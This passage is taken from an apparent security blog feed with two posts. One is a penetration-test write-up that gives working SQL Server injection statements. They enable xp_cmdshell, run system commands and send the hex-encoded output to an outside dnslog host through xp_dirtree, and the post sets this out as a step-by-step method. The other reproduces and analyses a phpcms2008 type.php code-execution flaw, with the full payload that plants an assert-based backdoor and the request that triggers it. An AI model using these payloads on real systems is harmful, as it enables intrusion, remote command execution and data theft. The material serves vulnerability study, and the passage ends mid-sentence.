    <link href="https://c1aysec.github.io/2019/01/11/%E8%AE%B0%E4%B8%80%E6%AC%A1dnslog%E6%8E%A5%E6%94%B6%E5%BC%82%E5%B8%B8%E5%88%86%E6%9E%90/"/>
    <id>https://c1aysec.github.io/2019/01/11/记一次dnslog接收异常分析/</id>
    <published>2019-01-11T08:08:50.000Z</published>
    <updated>2019-11-08T15:37:59.312Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次dnslog接收异常分析"><a href="#记一次dnslog接收异常分析" class="headerlink" title="记一次dnslog接收异常分析"></a>记一次dnslog接收异常分析</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>在一次渗透的过程中，遇到了sqlserver的注入点，在使用dnslog接收语句的执行结果时发现可以执行系统命令，但是在接收结果的时候遇到了些问题，问题如下</strong></p><a id="more"></a><p><strong>通过手工注入将命令执行结果发送至dnslog的语句如下：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">;<span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">--</span></div><div class="line">;<span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x77686f616d69</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;<span class="comment">-- </span></div><div class="line">;<span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> tmp1 <span class="keyword">from</span> tt_tmp) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY)))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;<span class="comment">--</span></div></pre></td></tr></table></figure><p><strong>以上语句用来执行whoami，然后使用dnslog接收命令执行的结果，结果如图</strong><br><img src="http://pic.c1imber.top/blog/20190111/y4ATogsXvqnW.png" alt="mark"></p><p><strong>这几条语句大致的意思是首先创建一个临时表，之后使用<code>xp_cmdshell</code>这个存储过程去执行whoami并将命令执行的结果插入到这个临时表，然后查询临时表的内容并将查询结果通过<code>xp_dirtree</code>这个存储过程发送至dnslog，这里需要对结果进行16进制编码，因为UNC路径里不允许有一些特殊字符，至于为什么要使用这种方式呢，一是因为网站有防护，直接上sqlmap的话会被封ip影响渗透，二是因为该注入点只能通过盲注，布尔盲注和时间盲注的速度我就不说了，大家都懂的，通过结果可以看到可以成功的执行whoami，但是接下来问题就出现了，我在执行ipconfig的时候出现了意料之外的结果,首先需要获取命令执行结果的长度，因为在使用dnslog注入的时候，UNC路径的长度也有限制，不能超过128个字符，超出长度的话语句就会执行失败，语句如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">;<span class="keyword">drop</span><span class="comment">/**/</span><span class="keyword">table</span><span class="comment">/**/</span>tt_tmp;<span class="comment">-- </span></div><div class="line">;<span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">-- </span></div><div class="line">;<span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x6970636f6e666967</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;<span class="comment">-- </span></div><div class="line">;<span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> <span class="keyword">cast</span>(<span class="keyword">len</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> tmp1 <span class="keyword">from</span> tt_tmp) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY))) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">32</span>)))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;<span class="comment">--</span></div></pre></td></tr></table></figure><p><strong>语句的作用首先删除临时表，执行ipconfig并将命令执行的结果插入临时表，接着查询结果并进行16进制编码，并且获取长度，结果如下</strong></p><p><img src="http://pic.c1imber.top/blog/20190111/Q1gGLf0EFcSP.png" alt="mark"></p><p><strong>可以看到这里出现了一个奇怪的问题，获取到的长度仅仅为62字节，而ipconfig的输出肯定是比这个要长的，接下来把内容输出一下看看</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;<span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> tmp1 <span class="keyword">from</span> tt_tmp) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY)))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;<span class="comment">--</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190111/pv73SFvb8xOF.png" alt="mark"></p><p><strong>可以看到并没有报错，成功接收到了结果，但是可以看出全是空白字符，这里猜测命令的执行结果是多行的，但是这里只获取了第一行结果的长度和内容</strong></p><p><strong>本地分析测试一波：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">-- </span></div><div class="line"><span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x77686f616d69</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190111/IKImOlhIrW2m.png" alt="mark"><br><strong>报错说禁止访问xp_cmdshell,开启一下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">',1;RECONFIGURE;</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190111/C5kidFPi7UAT.png" alt="mark"><br><strong>现在可以了</strong><br><img src="http://pic.c1imber.top/blog/20190111/RrJ8rlemlQKn.png" alt="mark"><br><strong>重新插入，执行ipconfig</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">-- </span></div><div class="line"><span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x6970636f6e666967</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190111/h9VBVHwqDAsU.png" alt="mark"><br><strong>通过结果可以看到确实是这样子没错，在将命令的执行结果插入表中的时候遇到了换行符，所以将执行结果插入到了多行内,第一行为空字符</strong><br><img src="http://pic.c1imber.top/blog/20190111/96glQf7Y0h9L.png" alt="mark"></p><p><strong>解决办法：</strong></p><p><strong>创建表的时候增加主键，之后逐行查询，修改后的语句如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tt_tmp (<span class="keyword">id</span> <span class="built_in">INT</span> PRIMARY <span class="keyword">KEY</span> <span class="keyword">IDENTITY</span>,tmp1 <span class="keyword">nvarchar</span>(<span class="number">4000</span>));</div><div class="line"><span class="keyword">DECLARE</span> @code <span class="built_in">varchar</span>(<span class="number">4000</span>);<span class="keyword">SET</span> @code=<span class="number">0x6970636f6e666967</span>;<span class="keyword">insert</span> <span class="keyword">into</span> tt_tmp(tmp1) exec master..xp_cmdshell @code;</div><div class="line"><span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY));</div></pre></td></tr></table></figure><p><strong>再次查询一下经过16进制编码后的长度，发现长度依旧被截断到了 62字节,wtf!?</strong><br><img src="http://pic.c1imber.top/blog/20190111/JwNvgKzhUdrq.png" alt="mark"><br><strong>但是直接查询内容的话并没有发现内容被截断</strong><br><img src="http://pic.c1imber.top/blog/20190111/Q5R2SXMtXd2X.png" alt="mark"><br><strong>说明截断发生在了16进制转换的过程中，分析了一波发现原来是由于转化为二进制的时候没有给VARBINARY设置长度，所以转化成二进制的时候使用的是默认长度而导致后面的内容被截断了，修改一下语句</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>)));</div></pre></td></tr></table></figure><p><strong>没有再发生截断问题</strong><br><img src="http://pic.c1imber.top/blog/20190111/k8jMVa6v8aS4.png" alt="mark"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">cast</span>(<span class="keyword">len</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>)))) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">32</span>));</div></pre></td></tr></table></figure><p><strong>发现长度为512字节，后面多出的会由空格x20填充</strong></p><p><strong>之后通过一系列折腾，总结使用dnslog接收sqlserver执行命令结果的方法</strong></p><p><strong>第一步：创建临时表用于接收命令的执行结果，需要定义主键：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tt_tmp (<span class="keyword">id</span> <span class="built_in">INT</span> PRIMARY <span class="keyword">KEY</span> <span class="keyword">IDENTITY</span>,tmp1 <span class="keyword">nvarchar</span>(<span class="number">4000</span>));</div></pre></td></tr></table></figure><p><strong>第二步：将命令执行结果插入临时表：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">DECLARE</span> @code <span class="built_in">varchar</span>(<span class="number">4000</span>);<span class="keyword">SET</span> @code=<span class="number">0x77686f616d69</span>;<span class="keyword">insert</span> <span class="keyword">into</span> tt_tmp(tmp1) exec master..xp_cmdshell @code;</div></pre></td></tr></table></figure><p><strong>第三步：由于插入了多行，首先需要获取行数(经过测试部分版本的sqlserver在UNC查询结果的位置不能有空格，需要去除空格，使用rtrim)：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>+(<span class="keyword">select</span> <span class="keyword">rtrim</span>(<span class="keyword">cast</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">32</span>))) <span class="keyword">from</span> tt_tmp)+<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;</div></pre></td></tr></table></figure><p><strong>第四步：将查询结果发送至dnslog(逐行读取，截取字符串)</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> <span class="keyword">substring</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>))),<span class="number">1</span>,<span class="number">60</span>))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;</div></pre></td></tr></table></figure><p><strong>每次截取60个字符，直到截取完512个字符为止</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> <span class="keyword">substring</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>))),<span class="number">61</span>,<span class="number">60</span>))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;</div><div class="line">...</div><div class="line">...</div><div class="line">总共截取9次，可以写脚本完成</div><div class="line"></div><div class="line">1-60</div><div class="line">61-120</div><div class="line">121-180</div><div class="line">181-240</div><div class="line">241-300</div><div class="line">301-360</div><div class="line">361-420</div><div class="line">421-480</div><div class="line">481-512</div></pre></td></tr></table></figure><p><strong>第五步：删除临时表，用于接收下一次命令执行的结果</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">drop</span><span class="comment">/**/</span><span class="keyword">table</span><span class="comment">/**/</span>tt_tmp;<span class="comment">--</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;记一次dnslog接收异常分析&quot;&gt;&lt;a href=&quot;#记一次dnslog接收异常分析&quot; class=&quot;headerlink&quot; title=&quot;记一次dnslog接收异常分析&quot;&gt;&lt;/a&gt;记一次dnslog接收异常分析&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在一次渗透的过程中，遇到了sqlserver的注入点，在使用dnslog接收语句的执行结果时发现可以执行系统命令，但是在接收结果的时候遇到了些问题，问题如下&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://c1aysec.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="https://c1aysec.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>phpcms2008 type.php代码执行漏洞分析与复现</title>
    <link href="https://c1aysec.github.io/2018/12/21/phpcms2008%20type.php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://c1aysec.github.io/2018/12/21/phpcms2008 type.php代码执行漏洞/</id>
    <published>2018-12-21T12:21:50.000Z</published>
    <updated>2019-11-06T17:04:41.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpcms2008-type-php代码执行漏洞分析与复现"><a href="#phpcms2008-type-php代码执行漏洞分析与复现" class="headerlink" title="phpcms2008 type.php代码执行漏洞分析与复现"></a>phpcms2008 type.php代码执行漏洞分析与复现</h1><h3 id="phpcms2008安装问题："><a href="#phpcms2008安装问题：" class="headerlink" title="phpcms2008安装问题："></a>phpcms2008安装问题：</h3><p><strong>安装时出现如下错误</strong><br><img src="http://pic.c1imber.top/blog/20181221/QpCFWTtDJwoh.png" alt="mark"></p><p><strong>修改以下文件”TYPE=MyISAM”处，修改为”ENGINE=MyISAM”</strong></p><p><strong>php文件：</strong></p><pre><code>/ads/include/create.table.php/install.php/include/admin/global.func.php/include/admin/sql.func.php/install/install.php</code></pre><p><img src="http://pic.c1imber.top/blog/20181221/ymb5x1PwgDpL.png" alt="mark"><br><strong>以及所有的.sql文件，”TYPE=MyISAM”修改为”ENGINE=MyISAM”</strong><br><img src="http://pic.c1imber.top/blog/20181221/4nP9Llvw7Ml6.png" alt="mark"><br><strong>就可以安装成功了</strong><br><img src="http://pic.c1imber.top/blog/20181221/CrNRV2k4Fgqh.png" alt="mark"></p><h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p><strong>payload:</strong></p><p><strong>在存在漏洞的网站后输入：</strong></p><pre><code>type.php?template=tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss</code></pre><p><img src="http://pic.c1imber.top/blog/20181221/OvkOxH3tP93B.png" alt="mark"><br><strong>之后将会在/data/cache_template/目录下生成rss.tpl.php文件，template的值被成功写入到该文件内，产生任意代码执行</strong></p><p><strong>接着访问：</strong></p><pre><code>/data/cache_template/rss.tpl.php?1=phpinfo();</code></pre><p><strong>即可执行phpinfo()</strong><br><img src="http://pic.c1imber.top/blog/20181221/U65J6DwPpbsA.png" alt="mark"></p><h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><strong>根据payload可知入口点在type.php,重要代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/include/common.inc.php'</span>;</div><div class="line">......</div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($template)) $template = <span class="string">'type'</span>;</div><div class="line">......</div><div class="line"><span class="keyword">include</span> template(<span class="string">'phpcms'</span>, $template);</div></pre></td></tr></table></figure><p><strong>其中$tamplate参数可控</strong></p><p><strong>下面来看/include/common.inc.php</strong></p><p><strong>重要代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_REQUEST)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(MAGIC_QUOTES_GPC)</div><div class="line">&#123;</div><div class="line">$_REQUEST = new_stripslashes($_REQUEST);</div><div class="line"><span class="keyword">if</span>($_COOKIE) $_COOKIE = new_stripslashes($_COOKIE);</div><div class="line">extract($db-&gt;escape($_REQUEST), EXTR_SKIP);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">$_POST = $db-&gt;escape($_POST);</div><div class="line">$_GET = $db-&gt;escape($_GET);</div><div class="line">$_COOKIE = $db-&gt;escape($_COOKIE);</div><div class="line">@extract($_POST,EXTR_SKIP);</div><div class="line">@extract($_GET,EXTR_SKIP);</div><div class="line">@extract($_COOKIE,EXTR_SKIP);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>)) $_REQUEST = filter_xss($_REQUEST, ALLOWED_HTMLTAGS);</div><div class="line"><span class="keyword">if</span>($_COOKIE) $db-&gt;escape($_COOKIE);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>以上的代码可用来接收传入的template，其中extract函数会对传入的GPC关联数组当中的键值对进行变量注册，其中EXTR_SKIP参数表示当变量名冲突时，不覆盖原有变量，所以当在GPC当中传入template参数时，传入的值会作为参数传入include template(‘phpcms’, $template)这里，跟进相关的函数，代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">template</span><span class="params">($module = <span class="string">'phpcms'</span>, $template = <span class="string">'index'</span>, $istag = <span class="number">0</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div><div class="line"><span class="keyword">if</span>(TPL_REFRESH &amp;&amp; (!file_exists($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>) &gt; @filemtime($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/tag.inc.php'</span>) &gt; @filemtime($compiledtplfile)))</div><div class="line">&#123;</div><div class="line"><span class="keyword">require_once</span> PHPCMS_ROOT.<span class="string">'include/template.func.php'</span>;</div><div class="line">template_compile($module, $template, $istag);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> $compiledtplfile;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>其中</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">define(<span class="string">'TPL_CACHEPATH'</span>, PHPCMS_ROOT.<span class="string">'data/cache_template/'</span>); <span class="comment">//模板缓存物理路径</span></div><div class="line">define(<span class="string">'TPL_ROOT'</span>, PHPCMS_ROOT.<span class="string">'templates/'</span>); <span class="comment">//模板保存物理路径</span></div><div class="line">define(<span class="string">'TPL_NAME'</span>, <span class="string">'default'</span>); <span class="comment">//当前模板方案目录</span></div></pre></td></tr></table></figure><p><strong>代码将传入的$template经过拼接后赋值给$compiledtplfile,此时$compiledtplfile的值变为了：</strong></p><pre><code>/data/cache_template/phpcms_tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss.tpl.php</code></pre><p><strong>这里的payload构造很有想象力，里这巧妙了利用了一个目录穿越的技巧，所以会将<code>phpcms_tag_(){};@unlink(_FILE_);assert($_GET[1]);{/</code>看成是一个目录，接着<code>../</code>则会跳过该目录</strong></p><p><strong>之后将路径传入file_exists检查文件是否存在，这里检查的文件路径实际上为：</strong></p><pre><code>/data/cache_template/rss.tpl.php</code></pre><p><strong>其中TPL_REFRESH为默认值1，并且/data/cache_template/rss.tpl.php这个文件是不存在的，所以符合条件，接着$tamplate被传入<code>template_compile($module, $template, $istag);</code>，跟进对应的函数</strong></p><p><strong>代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">template_compile</span><span class="params">($module, $template, $istag = <span class="number">0</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">$tplfile = TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>;</div><div class="line">$content = @file_get_contents($tplfile);</div><div class="line"><span class="keyword">if</span>($content === <span class="keyword">false</span>) showmessage(<span class="string">"$tplfile is not exists!"</span>);</div><div class="line">$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div><div class="line">$content = ($istag || substr($template, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">'tag_'</span>) ? <span class="string">'&lt;?php function _tag_'</span>.$module.<span class="string">'_'</span>.$template.<span class="string">'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span> : template_parse($content);</div><div class="line">$strlen = file_put_contents($compiledtplfile, $content);</div><div class="line">@chmod($compiledtplfile, <span class="number">0777</span>);</div><div class="line"><span class="keyword">return</span> $strlen;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>此时$temlate经过拼接赋值给了$tplfile，$tpfile的值变为了：</strong></p><pre><code>/templates/default/phpcms/tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss.html</code></pre><p><strong>之后<code>file_get_contents</code>会读取$tpfle这个文件的内容，如果文件不存在就会直接结束执行，但是这里的路径同样存在目录穿越的问题，实际上读取的路径为/templates/default/phpcms/rss.html这个文件，而这个文件是存在的，此处利用了路径穿越巧妙的绕过了此处的检查，之后<code>template_parse</code>函数将$tplfile文件当中的html代码编译成为php代码，然后和$template变量的内容拼接后写入到了$compiledtplfile这个文件中，也就是/data/cache<em>template/rss.tpl.php这个文件，这里要求template的前四个字符为`tag</em>`，payload的构造符合了要求，这时候php恶意代码就成功写入到了模板缓存文件内，产生了代码执行</strong></p><p><strong>写入的/data/cache_template/rss.tpl.php内的恶意代码为：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="function"><span class="keyword">function</span> <span class="title">_tag_phpcms_tag_</span><span class="params">()</span></span>&#123;&#125;;@unlink(_FILE_);assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);<span class="meta">?&gt;</span>'.template_parse($content, 1).'<span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20181221/nFxXup4DpuRj.png" alt="mark"></p><h3 id="关于payload构造的几个问题："><a href="#关于payload构造的几个问题：" class="headerlink" title="关于payload构造的几个问题："></a>关于payload构造的几个问题：</h3><p><strong>1.为什么加unlink？</strong></p><p><strong>其实可以不加，仔细看的话可以看到此处的unlink里面的参数书写的也不对并不会执行，加unlink的原因只是为了语法正确而已，经过测试：</strong></p><figure class="highlight 